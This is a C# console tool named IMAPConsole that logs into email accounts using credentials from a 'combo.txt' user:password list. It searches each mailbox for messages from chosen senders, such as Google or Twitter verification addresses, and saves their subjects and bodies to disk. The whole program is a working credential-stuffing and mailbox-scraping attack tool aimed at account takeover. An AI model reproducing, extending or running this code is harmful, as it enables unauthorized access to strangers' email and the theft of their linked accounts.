using Figgle;
using ImapConsole.Models;
using S22.Imap;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;

namespace ImapConsole
{
    class Program
    {
        private static Dictionary<String, IMAPServer> servers = new Dictionary<string, IMAPServer>();
        private static Dictionary<String, String> combo = new Dictionary<string, string>();
        static void Main(string[] args)
        {
            string[] lines = File.ReadAllLines("combo.txt");

            DateTime now = DateTime.Now;

            foreach (string line in lines)
            {
                string user = line.Split(':')[0];
                string pass = line.Split(':')[1];
                combo.Add(user, pass);
            }

            string[] imapServers = File.ReadAllLines("hoster.txt");

            foreach (string imapServer in imapServers)
            {
                string[] srv = imapServer.Split(':');
                string addr = srv[0];
                string server = srv[1];
                int port = short.Parse(srv[2]);
                bool ssl = true;
                if(port == 143)
                    ssl = false;
                servers.Add(addr, new IMAPServer(server, port, ssl));
            }

            ImapClient Client = null;

            Console.WriteLine(FiggleFonts.Doom.Render("IMAPConsole"));
            Console.WriteLine("https://github.com/notaryzw3b \n");
            Console.WriteLine("Enter mails adresses to scrape (ex: no-reply@accounts.google.com;verify@twitter.com OR verify@twitter.com) : ");

            string[] mailsadr = Console.ReadLine().Split(';');

            foreach (KeyValuePair<string, string> entry in combo)
            {
                string mailhost = entry.Key.Split('@')[1];
                IMAPServer settings;

                if (servers.ContainsKey(mailhost))
                    settings = servers[mailhost];
                else
                {
                    Console.WriteLine("This hoster doesn't exist, please add it on hoster.txt");
                    continue;
                }

                try
                {
                    Client = new ImapClient(settings.Server, settings.Port, entry.Key, entry.Value, AuthMethod.Auto, settings.isSSL);
                }
                catch (InvalidCredentialsException) { }

                if (Client != null)
                {

                    string path = "Results\\" + now.Year + "-" + now.Month + "-" + now.Day + ";" + now.Hour + "-" + now.Minute + "\\" + entry.Key;

                    foreach (string mailadr in mailsadr)
                    {
                        IEnumerable<uint> uids = Client.Search(SearchCondition.From(mailadr));
                        IEnumerable<MailMessage> messages = Client.GetMessages(uids);
                        Directory.CreateDirectory(path);
                        Console.Clear();
                        Console.WriteLine(FiggleFonts.Doom.Render("IMAPConsole"));
                        Console.WriteLine("\n\nMails found: " + messages.Count() + " | Checking " + entry.Key + " for " + mailadr);
                        foreach (MailMessage msg in messages)
                        {
                            StreamWriter file = new StreamWriter(path + "\\" + mailadr + ".txt", append: true);
                            file.WriteLine("-------------------------------------------------------------------------\nSUBJECT: " + msg.Subject + "\nFROM: " + msg.From + "\nTO: " + msg.To + "\nBODY: " + msg.Body + "\n-------------------------------------------------------------------------\n\n");
                            file.Close();
                        }
                    }
                    Client.Dispose();
                }
            }
        }
    }
}
